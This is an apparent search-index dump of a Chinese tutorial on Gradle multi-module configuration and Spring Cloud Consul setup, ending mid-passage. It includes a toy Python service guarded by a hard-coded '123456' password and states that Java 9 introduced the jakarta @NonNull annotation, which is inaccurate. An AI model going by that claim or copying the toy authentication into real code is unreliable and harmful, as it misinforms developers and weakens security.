\u53d8\u91cf\u7528\u6765\u58f0\u660e\u9879\u76ee\u7684 groupId \u548c version\u3002\u8fd9\u4e24\u4e2a\u53d8\u91cf\u662f maven \u7684\u6982\u5ff5\uff0cgradle \u4e5f\u652f\u6301\u3002groupId \u662f\u9879\u76ee\u7684\u7ec4\u7ec7\u540d\uff0cversion \u662f\u9879\u76ee\u7684\u7248\u672c\u53f7\u3002 \u4f8b\u5982\uff0c group = 'com.example' version = '0.0.1-SNAPSHOT'","title":"group \u548c version \u53d8\u91cf"},{"location":"02/#java_2","text":"java \u95ed\u5305\u7528\u6765\u914d\u7f6e java \u63d2\u4ef6\u7684\u4e00\u4e9b\u884c\u4e3a\u3002\u8fd9\u91cc\u6211\u4eec\u914d\u7f6e\u4e86 toolchain\uff0c\u5373\u5de5\u5177\u94fe\u3002\u8fd9\u4e2a\u95ed\u5305\u91cc\u53ef\u4ee5\u5b9a\u4e49 toolchain \u95ed\u5305\uff0c\u8fd9\u4e2a\u95ed\u5305\u91cc\u53ef\u4ee5\u5b9a\u4e49 languageVersion \u53d8\u91cf\uff0c\u5373\u8bed\u8a00\u7248\u672c\u3002 \u4f8b\u5982\uff0c java { toolchain { languageVersion = JavaLanguageVersion.of(17) } } \u8fd9\u91cc\u6211\u4eec\u6307\u5b9a\u4e86 java 17 \u4f5c\u4e3a\u6211\u4eec\u7684\u8bed\u8a00\u7248\u672c\u3002","title":"java \u95ed\u5305"},{"location":"02/#repositories","text":"\u4e00\u822c\u4f7f\u7528 mavenCentral() \u5c31\u53ef\u4ee5\uff0c\u8fd9\u4e2a\u51fd\u6570\u4f1a\u81ea\u52a8\u6dfb\u52a0 maven \u4e2d\u592e\u4ed3\u5e93\u3002\u5982\u679c\u7528\u522b\u7684\u4ed3\u5e93\uff0c\u53ef\u4ee5\u4f7f\u7528 mavenLocal()\u3001jcenter() \u7b49\u7b49\u3002","title":"repositories \u95ed\u5305"},{"location":"02/#dependencies","text":"dependencies \u95ed\u5305\u7528\u6765\u58f0\u660e\u9879\u76ee\u7684\u4f9d\u8d56\u3002 \u5e38\u7528\u7684\u51fd\u6570\u6709\uff0c implementation\uff0c\u7f16\u8bd1\u65f6\u4f9d\u8d56\uff0c\u76f8\u5f53\u4e8e maven \u7684 compile api\uff0c\u7f16\u8bd1\u65f6\u4f9d\u8d56\uff0c\u76f8\u5f53\u4e8e maven \u7684 compile\uff0c\u4f46\u662f api \u548c implementation \u7684\u533a\u522b\u662f\uff0capi \u4f1a\u4f20\u9012\u4f9d\u8d56\uff0cimplementation \u4e0d\u4f1a\u3002\u5373\u5982\u679c A \u4f9d\u8d56 B\uff0cB \u4f9d\u8d56 C\uff0c\u5982\u679c A \u4f9d\u8d56 B \u7684 api\uff0c\u90a3\u4e48 A \u4e5f\u4f1a\u4f9d\u8d56 C\uff0c\u5982\u679c A \u4f9d\u8d56 B \u7684 implementation\uff0c\u90a3\u4e48 A \u4e0d\u4f1a\u4f9d\u8d56 C\u3002 runtimeOnly\uff0c\u8fd0\u884c\u65f6\u4f9d\u8d56\uff0c\u76f8\u5f53\u4e8e maven \u7684 runtime testImplementation\uff0c\u6d4b\u8bd5\u7f16\u8bd1\u65f6\u4f9d\u8d56\uff0c\u76f8\u5f53\u4e8e maven \u7684 testCompile testRuntimeOnly\uff0c\u6d4b\u8bd5\u8fd0\u884c\u65f6\u4f9d\u8d56\uff0c\u76f8\u5f53\u4e8e maven \u7684 testRuntime \u5982\u679c\u8981\u5f15\u7528\u5176\u5b83\u9879\u76ee\uff0c\u4f7f\u7528 project \u51fd\u6570\u3002\u4f8b\u5982\uff0c implementation project(\":commons\")","title":"dependencies \u95ed\u5305"},{"location":"02/#ext","text":"ext \u95ed\u5305\u7528\u6765\u5b9a\u4e49\u4e00\u4e9b\u989d\u5916\u7684\u53d8\u91cf\u3002\u4f8b\u5982\uff0c ext { set('springVersion', '5.3.9') } \u4e4b\u540e\u53ef\u4ee5\u7528\u5b57\u7b26\u4e32\u63d2\u503c\u7684\u65b9\u5f0f\u5f15\u7528\u8fd9\u4e2a\u53d8\u91cf\uff0c\u4f8b\u5982\uff0c dependencies { implementation \"org.springframework:spring-context:${springVersion}\" }","title":"ext \u95ed\u5305"},{"location":"02/#allprojects-subprojects","text":"\u8fd9\u4e24\u4e2a\u95ed\u5305\u7684\u5185\u5bb9\u4f1a\u88ab\u4f20\u9012\u5230\u5b50\u9879\u76ee\u4e2d\u3002\u4f8b\u5982\uff0c allprojects { repositories { mavenCentral() } } \u8fd9\u6837\uff0c\u6240\u6709\u7684\u5b50\u9879\u76ee\u90fd\u4f1a\u81ea\u52a8\u6dfb\u52a0 maven \u4e2d\u592e\u4ed3\u5e93\u3002subprojects \u53ea\u4f1a\u4f20\u9012\u5230\u5b50\u9879\u76ee\uff0c\u800c allprojects \u4f1a\u4f20\u9012\u5230\u6240\u6709\u9879\u76ee\uff0c\u5305\u62ec\u6839\u9879\u76ee\u3002 \u6ce8\u610f\uff0c\u95ed\u5305\u91cc\u65e0\u6cd5\u4f7f\u7528 plugin \u95ed\u5305\uff0c\u9700\u8981\u4f7f\u7528 apply \u95ed\u5305\u6765\u6dfb\u52a0 plugin\u3002 plugins { id 'java' id 'org.springframework.boot' version '3.2.8' id 'io.spring.dependency-management' version '1.1.6' } allprojects { apply { plugin 'java' plugin 'org.springframework.boot' plugin 'io.spring.dependency-management' } }","title":"allprojects \u4e0e subprojects \u95ed\u5305"},{"location":"02/#settingsgradle","text":"\u6839\u9879\u76ee\u548c\u5b50\u9879\u76ee\u662f\u57fa\u4e8e settings.gradle \u6587\u4ef6\u6765\u5b9a\u4e49\u7684\u3002\u5728\u6839\u9879\u76ee\u7684 settings.gradle \u6587\u4ef6\u4e2d\uff0c\u53ef\u4ee5\u4f7f\u7528 include \u51fd\u6570\u6765\u5b9a\u4e49\u5b50\u9879\u76ee\u3002\u4f8b\u5982\uff0c rootProject.name = 'demo' include 'payment' include 'commons' include 'order' include 'order-feign' \u8fd9\u6837\uff0c\u5c31\u5b9a\u4e49\u4e86\u56db\u4e2a\u5b50\u9879\u76ee\uff0c\u5206\u522b\u662f payment\u3001commons\u3001order \u548c order-feign\u3002\u5b50\u9879\u76ee\u4e4b\u95f4\u53ef\u4ee5\u4e92\u76f8\u4f9d\u8d56\uff0c\u4f46\u8981\u4f7f\u7528\u6839\u9879\u76ee\u542f\u52a8\u3002","title":"settings.gradle \u6587\u4ef6"},{"location":"02/#spring-dependency-management","text":"Spring Dependency Management \u63d2\u4ef6\u662f Spring Boot \u7684\u4e00\u4e2a\u63d2\u4ef6\uff0c\u5b83\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u7ba1\u7406\u4f9d\u8d56\u7684\u7248\u672c\u3002\u6211\u4eec\u9700\u8981\u5728 plugins \u91cc\u58f0\u660e\u8fd9\u4e2a\u63d2\u4ef6\u3002 \u4e4b\u540e\uff0c\u4f7f\u7528 dependencyManagement \u95ed\u5305\u6765\u58f0\u660e\u4f9d\u8d56\u7684\u7248\u672c\u3002\u4f8b\u5982\uff0c plugins { id 'io.spring.dependency-management' version '1.1.5' } dependencyManagement { imports { mavenBom \"org.springframework.boot:spring-boot-dependencies:3.2.6\" } } \u8fd9\u6837\uff0c\u4e4b\u540e\u6211\u4eec\u5c31\u53ef\u4ee5\u7701\u7565\u7248\u672c\u53f7\uff0c\u53ea\u5199 groupId \u548c artifactId\u3002\u4f8b\u5982\uff0c dependencies { implementation 'org.springframework.boot:spring-boot-starter' } \u8fd9\u6837\uff0c\u6211\u4eec\u5c31\u4e0d\u7528\u62c5\u5fc3\u5728\u6839\u9879\u76ee\u548c\u5b50\u9879\u76ee\u4e4b\u95f4\u540c\u6b65\u7248\u672c\u53f7\u4e86\u3002\u4f8b\u5982\uff0c\u5982\u679c\u6211\u5728\u6839\u9879\u76ee\u4e2d\u8fd9\u6837\u914d\u7f6e\uff0c allprojects { repositories { mavenCentral() } dependencyManagement { imports { mavenBom \"org.springframework.boot:spring-boot-dependencies:3.2.6\" mavenBom \"org.postgresql:postgresql:${postgresqlVersion}\" } } } \u4e4b\u540e\uff0c\u5982\u679c\u6709\u5b50\u9879\u76ee\u4e2d\u4f9d\u8d56 postgres\uff0c\u53ea\u9700\u8981\uff0c dependencies { implementation 'org.postgresql:postgresql' } \u8fd9\u6837\u5c31\u4e0d\u7528\u62c5\u5fc3\u7248\u672c\u53f7\u4e0d\u4e00\u81f4\u7684\u95ee\u9898\u4e86\u3002 \u6b64\u5916\u8981\u6ce8\u610f\uff0cmavenBom \u5b9a\u4e49\u7684\u4e0d\u53ea\u662f\u4e00\u4e2a\u4f9d\u8d56\u7684\u7248\u672c\uff08\u53ef\u4ee5\u662f\uff09\uff0c\u8fd8\u53ef\u4ee5\u662f\u4e00\u7ec4\u4f9d\u8d56\u7684\u7248\u672c\u3002\u56e0\u6b64\uff0c\u4e0a\u9762\u6211\u4eec\u5b9a\u4e49\u4e86 Spring Cloud \u548c Spring Boot \u7248\u672c\u540e\uff0c\u4e0d\u9700\u8981\u518d\u5bf9\u6bcf\u4e2a\u4f9d\u8d56\u58f0\u660e\u7248\u672c\u53f7\u3002 \u4f46\u662f\uff0c\u5176\u5b9e\u5728 gradle \u4e2d\uff0c\u6700\u6b63\u7edf\u7684\u65b9\u6cd5\u662f\u4f7f\u7528 platform\uff0c\u8fd9\u662f gradle \u5185\u5efa\u7684\u65b9\u6cd5\uff0c\u4e0d\u9700\u8981\u4f9d\u8d56\u3002\u5373\u4e0b\u9762\u8fd9\u6837\uff0c implementation platform('org.springframework.boot:spring-boot-dependencies:2.7.8') platform \u51fd\u6570\u7684\u6548\u679c\u548c mavenBom \u4e00\u6837\u3002\u4f46\u662f\u9274\u4e8e\u5927\u90e8\u5206\u7684\u6587\u6863\u90fd\u76f4\u63a5\u63d0\u4f9b mavenBom\uff0c\u800cplatform \u9700\u8981\u81ea\u5df1\u53bb\u627e\uff0c\u6240\u4ee5\u6211\u4eec\u8fd9\u91cc\u5c31\u76f4\u63a5\u7528 mavenBom \u4e86\u3002","title":"Spring Dependency Management \u63d2\u4ef6"},{"location":"02/#nonnull","text":"\u7a7a\u6307\u9488\u5f02\u5e38\u4e00\u76f4\u662f\u4e2a\u5f88\u5934\u75bc\u7684\u95ee\u9898\uff0cJava 8 \u5f15\u5165\u4e86 Optional \u7c7b\u578b\uff0c\u4f46\u662f\u4f7f\u7528\u8d77\u6765\u5f88\u9ebb\u70e6\u3002Java 9 \u5f15\u5165\u4e86 @NonNull \u6ce8\u89e3\uff0c\u8fd9\u4e2a\u6ce8\u89e3\u53ef\u4ee5\u5e2e\u52a9\u6211\u4eec\u5728\u7f16\u8bd1\u65f6\u68c0\u67e5\u7a7a\u6307\u9488\u5f02\u5e38\u3002\u8fd9\u4e2a\u6ce8\u89e3\u5728 jakarta.annotation.Nonnull \u91cc\uff0c\u4f7f\u7528\u8fd9\u4e2a\u6ce8\u89e3\u540e\uff0c\u53ef\u4ee5\u5728\u7f16\u8f91\u5668\u91cc\u5f00\u542f\u7a7a\u6307\u9488\u68c0\u67e5\u3002\u4f8b\u5982\u5728 vscode\uff0c\u628a java.compile.nullAnalysis.nonnull: [jakarta.annotation.Nonnull] \u5373\u53ef\u3002\u5f53\u7136\uff0c\u4e00\u822c\u542f\u52a8\u4e00\u4e2a Java \u9879\u76ee\u65f6\uff0c\u53f3\u4e0b\u89d2\u4f1a\u6709\u4e00\u4e2a\u63d0\u793a\u6846\uff0c\u95ee\u7528\u6237\u662f\u5426\u5f00\u542f\u7a7a\u6307\u9488\u68c0\u67e5\u3002 \u4e0e\u6b64\u540c\u65f6\uff0c\u8fd8\u6709\u4e00\u4e2a jakarta.annotation.Nullable \u6ce8\u89e3\uff0c\u7528\u6765\u6807\u8bb0\u53ef\u4ee5\u4e3a\u7a7a\u7684\u53d8\u91cf\u3002 \u8fd9\u4e2a\u6ce8\u89e3\u53ea\u662f\u63d0\u4f9b\u7ed9\u7f16\u8f91\u5668\u4f7f\u7528\uff0c\u4e0d\u4f1a\u5f71\u54cd\u8fd0\u884c\u65f6\u7684\u884c\u4e3a\u3002","title":"@NonNull \u6ce8\u89e3"},{"location":"03/","text":"Spring Cloud \u901f\u6210 Ch3 Consul \u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0 \u7b2c\u4e09\u7ae0\u5f00\u59cb\uff0c\u6211\u4eec\u5f00\u59cb\u5b66\u4e60 Spring Cloud\uff0c\u56e0\u6b64\u6807\u9898\u4e5f\u6539\u6210\u4e86 Spring Cloud \u901f\u6210\u3002 \u672c\u7b14\u8bb0 Spring Cloud \u90e8\u5206\u53c2\u8003\u4e86\u5c1a\u7845\u8c37\u9633\u8001\u5e08\u7684 \u6559\u7a0b \u3002Spring Cloud \u5148\u8bb2 Consul\uff0cLoad Balancer\uff0cSpring Interface Client \u4e0e OpenFeign\uff0cResilience4j\uff0cMicroMeter\uff0cGateway\uff0cSeata\uff0cWebFlux\uff0cSpring Security\uff0cKeyCloak\uff0cRabbit MQ\uff0cGraphQL\uff0cgRPC \u7136\u540e\u662f k8s\u3002\u5c3d\u7ba1\u4e0a\u9762\u90e8\u5206\u6280\u672f\u4e25\u683c\u8bb2\u5e76\u4e0d\u5c5e\u4e8e\u5fae\u670d\u52a1\uff0c\u4f46\u5b83\u4eec\u5c5e\u4e8e Spring \u7684\u8fdb\u9636\u5185\u5bb9\uff0c\u8fd9\u91cc\u5c31\u4e00\u8d77\u8bb2\u4e86\u3002 \u5fae\u670d\u52a1\u67b6\u6784 \u5fae\u670d\u52a1\u67b6\u6784\u662f\u4e00\u79cd\u67b6\u6784\u98ce\u683c\uff0c\u5b83\u662f\u4e00\u79cd\u5c06\u5355\u4e00\u5e94\u7528\u7a0b\u5e8f\u5f00\u53d1\u4e3a\u4e00\u7ec4\u5c0f\u578b\u670d\u52a1\u7684\u65b9\u6cd5\uff0c\u6bcf\u4e2a\u670d\u52a1\u8fd0\u884c\u5728\u81ea\u5df1\u7684\u8fdb\u7a0b\u4e2d\uff0c\u670d\u52a1\u4e4b\u95f4\u901a\u8fc7 HTTP \u6216\u8005\u6d88\u606f\u961f\u5217\u901a\u4fe1\u3002\u6bcf\u4e2a\u670d\u52a1\u90fd\u6709\u81ea\u5df1\u7684\u6570\u636e\u5e93\uff0c\u72ec\u7acb\u90e8\u7f72\uff0c\u72ec\u7acb\u5347\u7ea7\u3002 \u4f8b\u5982\uff0c\u50cf\u662f\u6dd8\u5b9d\u8fd9\u6837\u7684\u8d2d\u7269\u7f51\u7ad9\uff0c\u53ef\u80fd\u6709\u5546\u54c1\u670d\u52a1\uff0c\u8ba2\u5355\u670d\u52a1\uff0c\u7528\u6237\u670d\u52a1\uff0c\u652f\u4ed8\u670d\u52a1\u7b49\u7b49\uff0c\u6bcf\u4e2a\u670d\u52a1\u90fd\u8dd1\u5728\u5355\u72ec\u7684\u670d\u52a1\u5668\u4e0a\uff0c\u8fd9\u6837\u53ef\u4ee5\u66f4\u597d\u5730\u5b9e\u73b0\u9ad8\u53ef\u7528\uff0c\u9ad8\u5e76\u53d1\uff0c\u9ad8\u6269\u5c55\u3002 \u5f53\u7136\uff0c\u4e0d\u7528\u6846\u67b6\u4e5f\u5b8c\u5168\u53ef\u4ee5\u505a\u5230\u5fae\u670d\u52a1\u2014\u2014\u6211\u73b0\u5728\u5c31\u7528 python \u5199\u4e00\u4e2a\u3002 from fastapi import FastAPI api = FastAPI() @api.get(\"/secret\") def get_secret(): return \"You found my secret!\" if __name__ == \"__main__\": import uvicorn uvicorn.run(api, host=\"0.0.0.0\", port=8000) from fastapi import FastAPI api = FastAPI() @api.get(\"/secret\") def get_secret(password: str): if password != \"123456\": return import requests return requests.get(\"http://localhost:8000/secret\").text if __name__ == \"__main__\": import uvicorn uvicorn.run(api, host=\"0.0.0.0\", port=8001) \u8fd9\u6837\u5c31\u5b9e\u73b0\u4e86\u4e00\u4e2a\u7b80\u5355\u7684\u5fae\u670d\u52a1\u67b6\u6784\uff0c\u4e00\u4e2a\u670d\u52a1\u63d0\u4f9b\u5bc6\u7801\u9a8c\u8bc1\uff0c\u53e6\u4e00\u4e2a\u670d\u52a1\u63d0\u4f9b\u79d8\u5bc6\u4fe1\u606f\u3002 \u5f53\u7136\uff0c\u4e8b\u60c5\u4e0d\u53ef\u80fd\u8fd9\u4e48\u7b80\u5355\uff0c\u5f53\u7cfb\u7edf\u5f00\u59cb scale \u4e4b\u540e\uff0c\u4f1a\u6709\u8fd9\u6837\u51e0\u4e2a\u95ee\u9898\uff1a \u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0\uff1a\u4e0d\u53ef\u80fd\u5168\u90e8\u4f7f\u7528 ip \u5730\u5740\u6216\u8005\u57df\u540d\u6765\u8bbf\u95ee\u670d\u52a1\uff0c\u56e0\u4e3a\u670d\u52a1\u53ef\u80fd\u4f1a\u52a8\u6001\u53d8\u5316\uff0c\u9700\u8981\u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0\u3002\u9700\u8981\u4e00\u4e2a\u5de5\u5177\u6765\u7edf\u4e00\u5904\u7406\u670d\u52a1\u8bf7\u6c42\u5e76\u5206\u53d1\u7ed9\u5bf9\u5e94\u7684\u670d\u52a1\u3002 \u670d\u52a1\u8c03\u7528\uff1a\u8c03\u7528\u5176\u5b83\u670d\u52a1\u7684\u65f6\u5019\uff0c\u4e0d\u53ef\u80fd\u603b\u662f\u4ece\u57fa\u7840\u7684 http \u8bf7\u6c42\u5f00\u59cb\uff0c\u9700\u8981\u4e00\u4e2a\u5de5\u5177\u6765\u7b80\u5316\u670d\u52a1\u8c03\u7528\u3002 \u8d1f\u8f7d\u5747\u8861\uff1a\u5982\u679c\u6211\u4eec\u5df2\u7ecf\u628a\u6bcf\u4e2a\u670d\u52a1\u90e8\u7f72\u5728\u591a\u4e2a\u670d\u52a1\u5668\u4e0a\uff0c\u90a3\u4e48\u5982\u679c\u6211\u4eec\u9700\u8981\u66f4\u5927\u7684 qps\uff0c\u4e00\u4e2a\u81ea\u7136\u7684\u60f3\u6cd5\u5c31\u662f\u90e8\u7f72\u66f4\u591a\u7684\u540c\u4e00\u4e2a\u670d\u52a1\u3002\u4f46\u662f\uff0c\u8fd9\u6837\u5c31\u4f1a\u521b\u5efa\u591a\u4e2a\u670d\u52a1\u4e8b\u4f8b\uff0c\u4f8b\u5982\u670d\u52a1 A1\uff0c\u670d\u52a1 A2 \u90fd\u63d0\u4f9b\u540c\u4e00\u4e2a\u670d\u52a1\uff0c\u4e3a\u4e86\u8fbe\u5230\u66f4\u5927\u7684 qps\uff0c\u6211\u4eec\u5e94\u5f53\u5c06\u6240\u6709\u7684\u8bf7\u6c42\u5747\u5300\u5206\u53d1\u7ed9 A1 \u548c A2\u3002\u8fd9\u5c31\u662f\u8d1f\u8f7d\u5747\u8861\u3002 \u670d\u52a1\u7194\u65ad\uff1a\u5982\u679c\u4e00\u4e2a\u670d\u52a1\u51fa\u73b0\u95ee\u9898\uff0c\u4f8b\u5982\u8d85\u65f6\uff0c\u90a3\u4e48\u6211\u4eec\u5e94\u5f53\u505c\u6b62\u5411\u8fd9\u4e2a\u670d\u52a1\u53d1\u9001\u8bf7\u6c42\uff0c\u800c\u4e0d\u662f\u4e00\u76f4\u7b49\u5f85\uff0c\u5e76\u8fdb\u884c\u964d\u7ea7\uff0c\u5373\u51cf\u5c11\u5f53\u524d\u652f\u6301\u7684\u529f\u80fd\uff0c\u4ee5\u907f\u514d\u96ea\u5d29\uff0c\u5373\u670d\u52a1\u96c6\u7fa4\u4e2d\u4e00\u4e2a\u670d\u52a1\u7684\u6545\u969c\uff0c\u7531\u4e8e\u6ca1\u6709\u505a\u597d\u670d\u52a1\u7194\u65ad\uff0c\u5bfc\u81f4\u4f9d\u8d56\u8fd9\u4e2a\u670d\u52a1\u7684\u5176\u5b83\u670d\u52a1\u4e5f\u51fa\u73b0\u6545\u969c\uff0c\u6700\u7ec8\u4e00\u5c42\u5c42\u5411\u4e0b\uff0c\u76f4\u5230\u6574\u4e2a\u7cfb\u7edf\u5d29\u6e83\u3002 \u670d\u52a1\u7f51\u5173\uff1a\u5982\u679c\u6211\u4eec\u6709\u591a\u4e2a\u670d\u52a1\uff0c\u90a3\u4e48\u6211\u4eec\u5e94\u5f53\u6709\u4e00\u4e2a\u7edf\u4e00\u7684\u5165\u53e3\uff0c\u8fd9\u4e2a\u5165\u53e3\u53ef\u4ee5\u505a\u4e00\u4e9b\u7edf\u4e00\u7684\u5904\u7406\uff0c\u4f8b\u5982\u9274\u6743\uff0c\u9650\u6d41\uff0c\u65e5\u5fd7\u7b49\u7b49\u3002 Spring Cloud \u5c31\u662f\u4e3a\u4e86\u89e3\u51b3\u8fd9\u4e9b\u95ee\u9898\u800c\u751f\u7684\u3002\u4e0d\u8fc7\uff0cSpring Cloud \u662f\u4e00\u5957\u53c8\u5927\u53c8\u590d\u6742\u7684\u6846\u67b6\uff0c\u73b0\u5728\u4e5f\u6709\u516c\u53f8\u5728\u501f\u52a9 k8s \u52a0\u4e0a\u5bb9\u5668\u6280\u672f\u5b9e\u73b0\u5fae\u670d\u52a1\u67b6\u6784\uff0c\u8fd9\u6837\u53ef\u4ee5\u4e0d\u4f9d\u8d56\u4e8e\u5177\u4f53\u7684\u8bed\u8a00\u548c\u6846\u67b6\uff0c\u800c\u662f\u53ef\u4ee5\u81ea\u7531\u9009\u62e9\u3002\u4e0d\u8fc7\uff0cSpring Cloud \u4f9d\u7136\u662f\u8f83\u4e3a\u6d41\u884c\u7684\u5fae\u670d\u52a1\u6846\u67b6\u4e4b\u4e00\u3002 \u4eca\u5929\u6211\u4eec\u5148\u4ecb\u7ecd\u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0\u3002 \u914d\u7f6e docker \u7f51\u7edc \u4e0b\u6587\u5c06\u4f7f\u7528 docker \u90e8\u7f72 Consul\uff0c\u4f46\u662f\u6709\u4e2a\u95ee\u9898\uff0c\u5728 macos \u548c windows \u4e0a\uff0cdocker\u672c\u8d28\u4e0a\u662f\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e0a\uff0c\u56e0\u6b64\u4e0d\u652f\u6301 host \u7f51\u7edc\u6a21\u5f0f\u3002Consul \u53ea\u80fd\u53d1\u73b0\u5f53\u524d\u5185\u7f51\u7684\u670d\u52a1\uff0c\u800c\u6211\u4eec\u7684 java \u662f\u8fd0\u884c\u5728\u5bbf\u4e3b\u673a\u4e0a\u7684\u3002\u6362\u8a00\u4e4b\uff0cConsul \u53ea\u80fd\u5728 docker \u8fd0\u884c\u7684\u90a3\u4e2a\u865a\u62df\u673a\u4e0a\u627e\u670d\u52a1\uff0c\u4f46\u8fd9\u4e2a\u865a\u62df\u673a\u88ab\u9690\u85cf\u4e86\u8d77\u6765\uff0c\u4e0d\u662f\u548c\u5bbf\u4e3b\u673a\u76f4\u901a\u7684\u3002 \u5f53\u7136\uff0c\u5982\u679c\u662f\u865a\u62df\u673a\u800c\u4e0d\u662f docker\uff0c\u90a3\u4e48\u53ef\u4ee5\u4f7f\u7528 host \u7f51\u7edc\u6a21\u5f0f\uff0c\u8fd9\u6837\u5c31\u53ef\u4ee5\u8ba9\u865a\u62df\u673a\u548c\u5bbf\u4e3b\u673a\u5728\u540c\u4e00\u4e2a\u7f51\u7edc\u4e0a\u3002\u4f46\u662f\uff0c\u5c3d\u7ba1\u5df2\u7ecf\u652f\u6301\u4e86 host \u6a21\u5f0f\uff0c\u4f46\u662f\u5728 macos \u548c windows \u4e0a\uff0cdocker \u672c\u8d28\u4e0a\u8fd8\u662f\u8fd0\u884c\u5728\u865a\u62df\u673a\u4e0a\uff0c\u56e0\u6b64\u65e0\u6cd5\u4f7f\u7528 host \u6a21\u5f0f\u3002\u51c6\u786e\u5730\u8bf4\uff0c\u8fd9\u4e2a host \u662f mac \u548c windows \u4e0a\u90a3\u4e2a docker linux \u865a\u62df\u673a\u7684 host\uff0c\u800c\u975e mac \u548c windows \u672c\u8eab\u3002 \u5f53\u7136\u4f60\u53ef\u4ee5\u628a java \u9879\u76ee\u653e\u5230 docker \u91cc\u9762\uff0c\u5982\u679c\u5728 windows \u4e0a\uff0c\u4e5f\u53ef\u4ee5\u6253\u5f00 windows container \u6a21\u5f0f\uff0c\u6216\u8005\u7528 linux \u7cfb\u7edf\u5f00\u53d1\u3002 \u4e00\u4e2a\u66f4\u597d\u7684\u89e3\u51b3\u65b9\u6848\u662f\u4f7f\u7528 docker-desktop-connector \u3002\u5b89\u88c5\u540e\u6309\u7167\u6587\u6863\u914d\u7f6e\u5373\u53ef\u3002\u8fd9\u6837\u5c31\u53ef\u4ee5\u8ba9\u672c\u673a\u7f51\u7edc\u548c docker \u865a\u62df\u673a\u7f51\u7edc\u8054\u901a\u3002\u53c8\u7531\u4e8e Consul \u662f\u7ed1\u5728\u865a\u62df\u673a\u7684 eth0 \u4e0a\u7684\uff0c\u56e0\u6b64\u6211\u4eec\u53ef\u4ee5\u5728\u672c\u673a\u4e0a\u8fde\u63a5\u5230\u865a\u62df\u673a\u7684 eth0\uff0c\u4ece\u800c\u8bbf\u95ee Consul\u3002 Consul \u670d\u52a1\u6ce8\u518c\u4e0e\u53d1\u73b0 \u542f\u52a8 Consul \u9996\u5148\uff0c\u542f\u52a8 Consul\u3002\u4e3a\u4e86\u65b9\u4fbf\u5f00\u53d1\uff0c\u6211\u4eec\u8fd8\u4e00\u5e76\u521b\u5efa\u4e00\u4e2a\u6570\u636e\u5e93\u3002 \u6570\u636e\u5e93\u7684 schema \u5982\u4e0b\uff1a DROP TABLE IF EXISTS payment; CREATE TABLE payment ( id SERIAL PRIMARY KEY, payment_no VARCHAR(50) NOT NULL, order_no VARCHAR(50) NOT NULL, user_id INT DEFAULT 1, amount DECIMAL(8,2) NOT NULL DEFAULT 9.9, deleted BOOLEAN NOT NULL DEFAULT FALSE, create_time TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP, update_time TIMESTAMPTZ NOT NULL DEFAULT CURRENT_TIMESTAMP ); COMMENT ON TABLE payment IS '\u652f\u4ed8\u4ea4\u6613\u8868'; COMMENT ON COLUMN payment.payment_no IS '\u652f\u4ed8\u6d41\u6c34\u53f7'; COMMENT ON COLUMN payment.order_no IS '\u8ba2\u5355\u6d41\u6c34\u53f7'; COMMENT ON COLUMN payment.user_id IS '\u7528\u6237\u8d26\u53f7ID'; COMMENT ON COLUMN payment.amount IS '\u4ea4\u6613\u91d1\u989d'; COMMENT ON COLUMN payment.deleted IS '\u5220\u9664\u6807\u5fd7\uff0c\u9ed8\u8ba40\u4e0d\u5220\u9664\uff0c1\u5220\u9664'; COMMENT ON COLUMN payment.create_time IS '\u521b\u5efa\u65f6\u95f4'; COMMENT ON COLUMN payment.update_time IS '\u66f4\u65b0\u65f6\u95f4'; docker compose \u6587\u4ef6\u5982\u4e0b\uff1a services: postgres: image: postgres:12.19 environment: POSTGRES_USER: user POSTGRES_PASSWORD: password POSTGRES_DB: demo volumes: - ./schema.sql:/docker-entrypoint-initdb.d/schema.sql ports: - 5432:5432 consul: image: hashicorp/consul:1.19 ports: - 8500:8500 volumes: - ./consul:/consul/data \u542f\u52a8\u540e\uff0c\u8bbf\u95ee http://localhost:8500 \uff0c\u53ef\u4ee5\u770b\u5230 Consul \u7684\u754c\u9762\u3002 \u6ce8\u610f\uff0cConsul \u5728 docker \u5bb9\u5668\u5173\u95ed\u65f6\u662f\u4e0d\u4f1a\u4fdd\u5b58\u6570\u636e\u7684\u3002 \u9879\u76ee\u914d\u7f6e \u5229\u7528\u6211\u4eec\u4e0a\u4e00\u7ae0\u8bb2\u7684 gradle\uff0c\u914d\u7f6e\u4e00\u4e2a\u591a\u6a21\u5757\u9879\u76ee\u3002 \u6839\u9879\u76ee\u4f7f\u7528\uff0c plugins { id 'java' id \"org.springframework.boot\" version \"3.2.6\" id 'io.spring.dependency-management' version '1.1.5' } allprojects { repositories { mavenCentral() } ext { set(\"springCloudVersion\", \"2023.0.2\") set(\"springBootVersion\", \"3.2.6\") set(\"lombokVersion\", \"1.18.28\") set(\"springdocVersion\", \"2.5.0\") set(\"postgresqlVersion\", \"42.7.3\") } group = 'io.github.fingerbone' version = '1.0-SNAPSHOT' } subprojects { apply { plugin 'java' plugin 'org.springframework.boot' plugin 'io.spring.dependency-management' } java { sourceCompatibility = JavaLanguageVersion.of(17) targetCompatibility = JavaLanguageVersion.of(17) } dependencyManagement { imports { mavenBom \"org.springdoc:springdoc-openapi-starter-webmvc-ui:${springdocVersion}\" mavenBom \"org.springframework.boot:spring-boot-starter-web:${springBootVersion}\" mavenBom \"org.postgresql:postgresql:${postgresqlVersion}\" mavenBom \"org.springframework.cloud:spring-cloud-dependencies:${springCloudVersion}\" } } dependencies { compileOnly \"org.projectlombok:lombok:${lombokVersion}\" annotationProcessor \"org.projectlombok:lombok:${lombokVersion}\" } } \u6ce8\u610f\uff0c\u8fd9\u91cc\u7684 Spring Cloud \u548c Spring Boot \u7248\u672c\u5fc5\u987b\u5339\u914d\uff0c\u5426\u5219\u4f1a\u51fa\u73b0\u4e00\u4e9b\u95ee\u9898\u3002\u517c\u5bb9\u6027\u8868\u89c1 Spring Cloud \u6587\u6863 \u3002 \u4e3a\u4e86\u65b9\u4fbf\uff0c\u5f15\u5165\u4e86 spring doc\uff0c\u52a0\u5165 spring doc \u540e\uff0c\u53ef\u4ee5\u8bbf\u95ee swagger-ui/index.html \u6765\u67e5\u770b\u63a5\u53e3\u6587\u6863\uff0c\u5e76\u8fdb\u884c\u6d4b\u8bd5\u3002 \u6b64\u5916\uff0c org.springframework.cloud:spring-cloud-dependencies 